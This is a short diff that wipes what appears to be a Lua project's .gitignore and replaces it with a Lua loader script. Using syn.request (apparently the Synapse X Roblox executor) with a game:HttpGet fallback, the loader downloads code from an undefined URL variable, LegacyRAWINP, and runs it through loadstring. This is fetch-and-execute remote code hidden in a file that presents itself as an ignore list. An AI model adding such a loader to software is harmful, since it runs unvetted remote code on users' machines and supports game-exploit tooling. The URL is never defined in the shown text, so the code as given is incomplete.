@@ -1,41 +1,18 @@
-# Compiled Lua sources
-luac.out
+local LegacyMethod = ("GET")
+local LegacyHeaders = {}
 
-# luarocks build files
-*.src.rock
-*.zip
-*.tar.gz
+local Success, Error = pcall(function()
+    local RequestData = {
+     Url = (LegacyRAWINP),
+     Method = (LegacyMethod),
+     Headers = (LegacyHeaders)
+    }
 
-# Object files
-*.o
-*.os
-*.ko
-*.obj
-*.elf
+    loadstring(syn.request(RequestData).Body)()
+end)
 
-# Precompiled Headers
-*.gch
-*.pch
+if not Success then
+   local Dep = game:HttpGet(LegacyRAWINP)
 
-# Libraries
-*.lib
-*.a
-*.la
-*.lo
-*.def
-*.exp
-
-# Shared objects (inc. Windows DLLs)
-*.dll
-*.so
-*.so.*
-*.dylib
-
-# Executables
-*.exe
-*.out
-*.app
-*.i*86
-*.x86_64
-*.hex
-
+   loadstring(Dep)()
+end
